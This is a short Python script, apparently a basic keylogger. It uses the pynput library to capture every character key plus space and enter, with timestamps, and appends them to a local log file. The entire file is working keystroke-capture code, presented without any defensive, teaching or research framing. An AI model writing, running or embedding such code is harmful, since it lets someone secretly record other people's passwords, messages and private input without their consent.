from pynput import keyboard
import os
from datetime import datetime

LOG_FILE = 'logs/keystrokes.txt'
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

def on_press(key):
    with open(LOG_FILE, 'a') as f:
        try:
            f.write(f"{datetime.now()} - {key.char}\n")  # character keys
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(f"{datetime.now()} - SPACE\n")
            elif key == keyboard.Key.enter:
                f.write(f"{datetime.now()} - ENTER\n")
            else:
                pass  # this one ignores shift, ctrl and alt.

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
